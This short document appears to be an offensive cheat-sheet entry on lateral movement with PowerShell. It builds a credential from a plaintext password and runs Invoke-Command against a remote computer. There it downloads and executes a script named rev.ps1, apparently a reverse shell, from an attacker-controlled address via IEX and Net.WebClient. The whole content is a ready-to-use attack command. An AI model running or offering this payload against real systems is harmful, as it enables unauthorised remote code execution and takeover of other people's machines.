### with SecureString credential
```powershell
$pass = ConvertTo-SecureString 'password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('.\user', $pass)
hostname
invoke-command -Computer ComputerHostname -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```
change ComputerHostname.
`-ConfigurationName ...` parameter might be required to run commands for special restricted user permissions

